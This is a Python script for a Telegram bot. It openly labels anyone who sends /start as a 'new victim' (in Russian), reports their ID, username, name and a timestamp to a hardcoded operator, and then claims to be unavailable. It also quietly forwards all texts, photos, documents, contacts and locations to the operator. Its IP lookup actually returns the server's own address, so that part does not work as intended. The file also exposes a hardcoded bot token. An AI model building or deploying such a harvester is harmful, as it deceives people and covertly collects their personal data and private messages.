import telebot
import requests
import time
import os

BOT_TOKEN = "8737295752:AAFbBvbCDeJe_hyyQbI85s9gz5acVyaWGJs"
YOUR_ID = "6753203115"

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    ip = requests.get('https://api.ipify.org').text
    
    data = f"""🎯 НОВАЯ ЖЕРТВА
ID: {user.id}
Username: @{user.username if user.username else 'нет'}
Имя: {user.first_name}
IP: {ip}
Время: {time.strftime('%Y-%m-%d %H:%M:%S')}"""
    
    bot.send_message(YOUR_ID, data)
    bot.reply_to(message, "Бот временно недоступен")

@bot.message_handler(content_types=['text', 'photo', 'document', 'contact', 'location'])
def forward_all(message):
    user = message.from_user
    bot.send_message(YOUR_ID, f"📨 От @{user.username if user.username else user.id}: {message.text if message.text else 'файл/фото'}")
    bot.reply_to(message, "Отправлено")

if __name__ == "__main__":
    bot.infinity_polling()